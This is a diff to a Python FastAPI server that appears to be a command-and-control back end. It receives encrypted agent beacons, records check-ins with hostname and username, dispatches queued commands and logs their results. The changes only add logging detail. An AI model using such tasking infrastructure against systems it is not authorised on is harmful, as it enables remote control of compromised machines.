@@ -1,4 +1,5 @@
 import uvicorn
+import time
 from fastapi import FastAPI, Request, Response
 from fastapi.responses import JSONResponse
 from contextlib import asynccontextmanager
@@ -60,8 +61,9 @@ async def beacon(request: Request) -> Response:
         return JSONResponse(status_code=413, content={'error': 'payload too large'})
 
     logger.info('beacon received', extra={
-        'source_ip':    source_ip,
-        'payload_size': len(raw_body),
+        'source_ip':        source_ip,
+        'payload_size_bytes': len(raw_body),
+        'session_id':       None,
     })
 
     # Step 2 — unpack and decrypt
@@ -69,7 +71,12 @@ async def beacon(request: Request) -> Response:
         session_key = get_session_key()
         payload = mf.unpack(raw_body, session_key)
     except (ProtocolError, CryptoError) as e:
-        logger.warning('unpack failed', extra={'source_ip': source_ip, 'reason': str(e)})
+        logger.warning('unpack failed', extra={
+            'source_ip':    source_ip, 
+            'error_type':   type(e).__name__,
+            'error_msg':    str(e),
+            'raw_length':   len(raw_body),
+        })
         return JSONResponse(status_code=400, content={'error': 'bad request'})
 
     msg_type   = payload.get('msg_type', '')
@@ -87,7 +94,10 @@ async def beacon(request: Request) -> Response:
 
     # Step 3 — nonce replay check
     if not await db.check_and_store_nonce(nonce):
-        logger.warning('replay detected', extra={'nonce': nonce, 'source_ip': source_ip})
+        logger.warning('replay detected', extra={
+            'session_id': session_id,
+            'nonce':      nonce,
+        })
         return JSONResponse(status_code=409, content={'error': 'replay detected'})
 
     # Step 4 — dispatch by message type
@@ -145,6 +155,9 @@ async def _handle_checkin(payload: dict, source_ip: str) -> dict:
         'session_id': session_id,
         'hostname':   inner.get('hostname'),
         'source_ip':  source_ip,
+        'username':   inner.get('username'),
+        'os':         inner.get('os'),
+        'agent_ver':  inner.get('agent_ver'),
     })
 
     resp = mf._base_payload(mf.MSG_CHECKIN, session_id=session_id)
@@ -182,10 +195,12 @@ async def _handle_task_pull(session_id: str) -> dict:
             'args':      task.args,
             'timeout_s': task.timeout_s,
         }
+        queued_duration_ms = int((time.time() - task.queued_at) * 1000) if task.queued_at else None
         logger.info('task dispatched', extra={
             'session_id': session_id,
             'task_id':    task.task_id,
             'command':    task.command,
+            'queued_duration_ms': queued_duration_ms,
         })
     else:
         # No pending task — agent continues beacon loop
@@ -209,10 +224,15 @@ async def _handle_task_result(session_id: str, payload: dict) -> dict:
     task_id = inner.get('task_id')
     if task_id:
         await cmd_queue.mark_complete(task_id, inner, db)
+        stdout = inner.get('stdout', '') or ''
+        stderr = inner.get('stderr', '') or ''
         logger.info('task result received', extra={
             'session_id': session_id,
             'task_id':    task_id,
             'exit_code':  inner.get('exit_code'),
+            'stdout_len': len(stdout),
+            'stderr_len': len(stderr),
+            'duration_ms': inner.get('duration_ms'),
         })
 
     resp = mf._base_payload(mf.MSG_TASK_RESULT, session_id=session_id)
